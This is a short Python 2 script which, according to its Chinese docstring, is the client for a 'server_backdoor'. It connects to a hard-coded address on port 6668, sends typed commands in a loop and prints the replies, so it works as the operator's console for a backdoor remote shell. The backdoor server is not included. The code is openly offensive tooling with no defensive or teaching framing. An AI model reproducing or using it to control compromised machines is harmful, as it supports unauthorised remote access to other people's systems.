#import socket
#c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
'''
对应的server_backdoor的客户端
'''

from socket import *
c=socket(AF_INET,SOCK_STREAM)
c.connect(('192.168.75.149',6668))
while 1:
 data=raw_input('~:')
 c.send(data)
 text=c.recv(1024)
 print text

c.close()
